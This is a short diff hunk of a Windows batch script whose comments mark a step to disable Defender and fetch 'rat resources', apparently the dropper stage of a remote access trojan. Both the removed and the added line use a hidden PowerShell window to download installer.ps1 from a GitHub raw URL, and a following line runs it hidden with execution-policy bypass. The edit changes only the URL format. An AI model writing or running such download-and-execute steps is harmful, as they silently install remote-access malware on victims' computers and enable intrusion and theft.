@@ -32,5 +32,5 @@ IF %errorlevel% NEQ 0 (
 REM desable defender
 
 REM rat resources
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/m98m98/tar/refs/heads/main/installer.ps1 -OutFile installer.ps1"
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/m98m98/tar/refs/heads/main/installer.ps1 -OutFile installer.ps1"
 powershell Start-Process -windowstyle hidden -ep bypass "installer.ps1"
